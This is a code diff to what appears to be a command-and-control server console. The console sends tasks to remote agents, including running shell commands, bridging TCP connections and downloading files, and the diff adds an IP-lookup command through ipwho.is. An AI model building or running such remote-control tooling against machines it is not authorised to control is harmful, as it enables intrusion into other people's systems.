@@ -89,7 +89,8 @@ export const setupWS = (httpServer) => {
       "bridge <host1>:<port1> <host2>:<port2>": "Start a TCP bridge b/w 2 servers",
       "system <cmd>": "Run a shell command (same as '!<cmd>')",
       "!<cmd>": "A shorthand for 'system <cmd>'",
-      "webload <url> <file>": "Download a file from a URL"
+      "webload <url> <file>": "Download a file from a URL",
+      "ipinfo": "Get agent IP info using ipwho.is"
     }
 
     /**
@@ -306,6 +307,10 @@ export const setupWS = (httpServer) => {
           }else if (input === "abort"){
             taskModel.createTask(username, {
               agentID, taskType: "abort"
+            });
+          }else if (input === "ipinfo"){
+            taskModel.createTask(username, {
+              agentID, taskType: "ipinfo"
             });
           }else{ // Unknown query
             client.emit("agent_console_output", {
